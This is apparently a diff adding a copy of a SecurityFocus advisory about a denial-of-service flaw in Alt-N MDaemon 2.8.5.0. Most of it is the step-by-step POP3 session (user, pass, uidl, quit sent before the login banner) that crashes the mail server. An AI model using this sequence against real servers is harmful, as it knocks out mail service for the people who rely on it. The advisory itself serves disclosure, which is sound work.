@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/1366/info
+
+A remote user is capable of crashing Alt-N MDaemon 2.8.5.0 by executing the pass command, then the UIDL command and quitting the mail server before the UIDL has returned a response. This must be done before the user is presented with the POP3 login banner. Restarting the application is required in order to regain normal functionality. 
+
+Perform the following very quickly:
+
++OK <target> POP service ready using MDaemon
+v2.8.5.0 T
+
+User <username>
++OK <username>... Recipient ok
+pass <password>
+-ERR that command is valid only in the AUTHORIZATION state!
+uidl
+-ERR unknown POP command!
+quit
++OK
+.
+quit
++OK <username> <target> POP Server signing off (mailbox empty) 
